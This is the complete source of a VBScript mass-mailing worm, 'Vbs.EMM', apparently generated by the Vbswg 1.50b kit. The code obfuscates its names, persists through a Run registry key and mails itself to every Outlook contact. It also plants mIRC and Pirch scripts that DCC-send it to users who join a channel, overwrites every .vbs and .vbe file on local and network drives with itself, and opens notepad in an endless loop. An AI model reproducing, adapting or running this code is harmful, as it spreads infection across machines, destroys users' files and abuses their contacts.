'Vbs.EMM Created By PetiK
On Error Resume Next
Set NHW5n890Zez = CreateObject("WScript.Shell")
NHW5n890Zez.regwrite "HKCU\software\EMM\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set Q5A18fo322B= Createobject("scripting.filesystemobject")
Q5A18fo322B.copyfile wscript.scriptfullname,Q5A18fo322B.GetSpecialFolder(1)& "\EMM.vbs"
NHW5n890Zez.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe "&Q5A18fo322B.GetSpecialFolder(1)& "\EMM.vbs %"
if NHW5n890Zez.regread ("HKCU\software\EMM\mailed") <> "1" then
Wks0G6EG5Vj()
end if
if NHW5n890Zez.regread ("HKCU\software\EMM\mirqued") <> "1" then
DZkwMtxjRh0 ""
end if
if NHW5n890Zez.regread ("HKCU\software\EMM\pirched") <> "1" then
FxU0RLHrEZ4 ""
end if
FE45wZvqDfB()
Do
NHW5n890Zez.run "notepad",false
loop
JpJfvBb40gJ= ""
JpJfvBb40gJ= NHW5n890Zez.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
If (JpJfvBb40gJ= "") Then
JpJfvBb40gJ = "c:"
End If
If Right(JpJfvBb40gJ, 1) = " \ " Then JpJfvBb40gJ = Mid(JpJfvBb40gJ, 1, Len(JpJfvBb40gJ) - 1)
If Not (Q5A18fo322B.fileexists(Q5A18fo322B.getspecialfolder(0) & "\kav2010_9.0.0.463FR.exe")) Then
If Not (Q5A18fo322B.fileexists(JpJfvBb40gJ & "\kav2010_9.0.0.463FR.exe")) Then
NHW5n890Zez.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http:\\telecharger.kaspersky.fr\download\partners\01net\kav2010_9.0.0.463FR.exe"
Else
NHW5n890Zez.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
Q5A18fo322B.copyfile JpJfvBb40gJ & "\kav2010_9.0.0.463FR.exe", Q5A18fo322B.getspecialfolder(0) & "\kav2010_9.0.0.463FR.exe"
NHW5n890Zez.run Q5A18fo322B.getspecialfolder(0) & "\kav2010_9.0.0.463FR.exe", 1, False
end if
Function Wks0G6EG5Vj()
On Error Resume Next
Set w9kobYy41i1 = CreateObject("Outlook.Application")
If w9kobYy41i1= "Outlook"Then
Set Kuub5qpM0Jl=w9kobYy41i1.GetNameSpace("MAPI")
Set X2c4Qi6o5nm= Kuub5qpM0Jl.AddressLists
For Each GhHGOEw1K4a In X2c4Qi6o5nm
If GhHGOEw1K4a.AddressEntries.Count <> 0 Then
PA18fo322Bh = GhHGOEw1K4a.AddressEntries.Count
For tI4p0fEc2zQ= 1 To PA18fo322Bh
Set hW5n890ZezW = w9kobYy41i1.CreateItem(0)
Set os0G6EG5Vja = GhHGOEw1K4a.AddressEntries(tI4p0fEc2zQ)
hW5n890ZezW.To = os0G6EG5Vja.Address
hW5n890ZezW.Subject = "Here you have, ;o)"
hW5n890ZezW.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set zkwMtxjRh05=hW5n890ZezW.Attachments
zkwMtxjRh05.Add Q5A18fo322B.GetSpecialFolder(1)& "\EMM.vbs"
hW5n890ZezW.DeleteAfterSubmit = True
If hW5n890ZezW.To <> "" Then
hW5n890ZezW.Send
NHW5n890Zez.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function DZkwMtxjRh0(yU0RLHrEZ4m)
On Error Resume Next
if yU0RLHrEZ4m = "" then
if Q5A18fo322B.fileexists("c:\mirc\mirc.ini") then yU0RLHrEZ4m="c:\mirc"
if Q5A18fo322B.fileexists("c:\mirc32\mirc.ini") then yU0RLHrEZ4m="c:\mirc32"
e45wZvqDfBJ=NHW5n890Zez.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Q5A18fo322B.fileexists(e45wZvqDfBJ & "\mirc\mirc.ini") then yU0RLHrEZ4m=e45wZvqDfBJ & "\mirc"
end if
if yU0RLHrEZ4m <> "" then
set xJfvBb40gJw = Q5A18fo322B.CreateTextFile(yU0RLHrEZ4m & "\script.ini", True)
YkobYy41i15="[script]"
YkobYy41i15=YkobYy41i15&vbcrlf&"n0=on 1:JOIN:#:{"
YkobYy41i15=YkobYy41i15&vbcrlf&"n1=  /if ( $nick == $me ) { halt }"
YkobYy41i15=YkobYy41i15&vbcrlf&"n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&Q5A18fo322B.GetSpecialFolder(1)& "\EMM.vbs" & vbCrLf & "n3=}"
xJfvBb40gJw.writeline YkobYy41i15
xJfvBb40gJw.close
NHW5n890Zez.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function FxU0RLHrEZ4(iub5qpM0Jlt)
On Error Resume Next
if iub5qpM0Jlt="" then
if Q5A18fo322B.fileexists("c:\pirch\Pirch32.exe") then iub5qpM0Jlt="c:\pirch"
if Q5A18fo322B.fileexists("c:\pirch32\Pirch32.exe") then iub5qpM0Jlt="c:\pirch32"
jHGOEw1K4an=NHW5n890Zez.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Q5A18fo322B.fileexists(jHGOEw1K4an & "\pirch\Pirch32.exe") then iub5qpM0Jlt=jHGOEw1K4an & "\pirch\Pirch32.exe"
end if
if iub5qpM0Jlt <> "" then
set Fc4Qi6o5nm1= Q5A18fo322B.CreateTextFile(iub5qpM0Jlt & "\events.ini", True)
Fc4Qi6o5nm1.WriteLine "[Levels]"
Fc4Qi6o5nm1.WriteLine "Enabled=1"
Fc4Qi6o5nm1.WriteLine "Count=6"
Fc4Qi6o5nm1.WriteLine "Level1=000-Unknowns"
Fc4Qi6o5nm1.WriteLine "000-UnknownsEnabled=1"
Fc4Qi6o5nm1.WriteLine "Level2=100-Level 100"
Fc4Qi6o5nm1.WriteLine "100-Level 100Enabled=1"
Fc4Qi6o5nm1.WriteLine "Level3=200-Level 200"
Fc4Qi6o5nm1.WriteLine "200-Level 200Enabled=1"
Fc4Qi6o5nm1.WriteLine "Level4=300-Level 300"
Fc4Qi6o5nm1.WriteLine " 300-Level 300Enabled=1"
Fc4Qi6o5nm1.WriteLine "Level5=400-Level 400 "
Fc4Qi6o5nm1.WriteLine "400-Level 400Enabled=1"
Fc4Qi6o5nm1.WriteLine "Level6=500-Level 500"
Fc4Qi6o5nm1.WriteLine "500-Level 500Enabled=1"
Fc4Qi6o5nm1.WriteLine ""
Fc4Qi6o5nm1.WriteLine "[000-Unknowns]"
Fc4Qi6o5nm1.WriteLine "UserCount=0"
Fc4Qi6o5nm1.WriteLine "EventCount=0"
Fc4Qi6o5nm1.WriteLine ""
Fc4Qi6o5nm1.WriteLine "[100-Level 100]"
Fc4Qi6o5nm1.WriteLine "User1=*!*@*"
Fc4Qi6o5nm1.WriteLine "UserCount=1"
Fc4Qi6o5nm1.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & Q5A18fo322B.GetSpecialFolder(1) & "\EMM.vbs"
Fc4Qi6o5nm1.WriteLine "EventCount=1"
Fc4Qi6o5nm1.WriteLine ""
Fc4Qi6o5nm1.WriteLine "[200-Level 200]"
Fc4Qi6o5nm1.WriteLine "UserCount=0"
Fc4Qi6o5nm1.WriteLine "EventCount=0"
Fc4Qi6o5nm1.WriteLine ""
Fc4Qi6o5nm1.WriteLine "[300-Level 300]"
Fc4Qi6o5nm1.WriteLine "UserCount=0"
Fc4Qi6o5nm1.WriteLine "EventCount=0"
Fc4Qi6o5nm1.WriteLine ""
Fc4Qi6o5nm1.WriteLine "[400-Level 400]"
Fc4Qi6o5nm1.WriteLine "UserCount=0"
Fc4Qi6o5nm1.WriteLine "EventCount=0"
Fc4Qi6o5nm1.WriteLine ""
Fc4Qi6o5nm1.WriteLine "[500-Level 500]"
Fc4Qi6o5nm1.WriteLine "UserCount=0"
Fc4Qi6o5nm1.WriteLine "EventCount=0"
Fc4Qi6o5nm1.close
NHW5n890Zez.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
Function FE45wZvqDfB()
On Error Resume Next
Set Dy3R2mPsM2B = Q5A18fo322B.Drives
For Each IcTP5MyJ7ZU In Dy3R2mPsM2B
If IcTP5MyJ7ZU.Drivetype = Remote Then
XoPPWM0KS3a= IcTP5MyJ7ZU & "\"
Call GP1bq3W9U18(XoPPWM0KS3a)
ElseIf IcTP5MyJ7ZU.IsReady Then
XoPPWM0KS3a= IcTP5MyJ7ZU&"\"
Call GP1bq3W9U18(XoPPWM0KS3a)
End If
Next
End Function
Function GP1bq3W9U18(E9dXXM9CJR7)
wE2nSA7HlgL=E9dXXM9CJR7
Set ORz7nEubiSq= Q5A18fo322B.GetFolder(wE2nSA7HlgL)
Set C3KgSwHK773= ORz7nEubiSq.Files
For Each OFN5JKZ4xiu In C3KgSwHK773
if Q5A18fo322B.GetExtensionName(OFN5JKZ4xiu.path) = "vbs" then
Q5A18fo322B.copyfile wscript.scriptfullname , OFN5JKZ4xiu.path , true
end if
if Q5A18fo322B.GetExtensionName(OFN5JKZ4xiu.path) = "vbe" then
Q5A18fo322B.copyfile wscript.scriptfullname , OFN5JKZ4xiu.path , true
end if
if OFN5JKZ4xiu.name = "mirc.ini" then
DZkwMtxjRh0(OFN5JKZ4xiu.ParentFolder)
end if
if OFN5JKZ4xiu.name = "Pirch32.exe" then
FxU0RLHrEZ4(OFN5JKZ4xiu.ParentFolder)
end if
Next
Set OFN5JKZ4xiu= ORz7nEubiSq.SubFolders
For Each V7eI22z8P4v In OFN5JKZ4xiu
Call GP1bq3W9U18(V7eI22z8P4v.path)
Next
End Function
'Vbswg 1.50b
